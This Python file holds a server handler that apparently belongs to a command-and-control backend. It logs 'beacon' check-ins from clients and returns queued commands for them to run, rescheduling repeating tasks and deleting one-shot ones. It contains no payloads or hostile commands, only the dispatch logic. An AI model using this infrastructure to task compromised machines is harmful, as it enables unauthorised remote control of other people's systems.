from server import db
from server.models import Task, User
from datetime import datetime, timedelta
from sqlalchemy import or_

def handle_beacon_request(client_id):
    user = User.query.filter_by(client_id=client_id).first()
    
    if user:
        user.last_beacon_signal = datetime.utcnow()
        print(f"[+] Updated last_beacon_signal for client_id: {client_id}") # Debugging purposes
        db.session.commit()
    else:
        # TODO: Implement emergency mechanism when client_id not found in User table
        print(f"[!] Client ID: {client_id} not found in User table.") # Debugging purposes
        return {}
        
    tasks = Task.query.filter(
        Task.client_id == client_id,
        or_(Task.next_execution == None, Task.next_execution <= datetime.utcnow())
    ).all()
    
    task_commands = []
    for task in tasks:
        task_commands.append(task.command)
        
        if task.repeat_interval:
            task.next_execution = datetime.utcnow() + timedelta(seconds=task.repeat_interval)
        
        if task.run_once:
            db.session.delete(task)
        else:
            db.session.add(task)
    
    db.session.commit()

    response = {"commands": task_commands}
    return response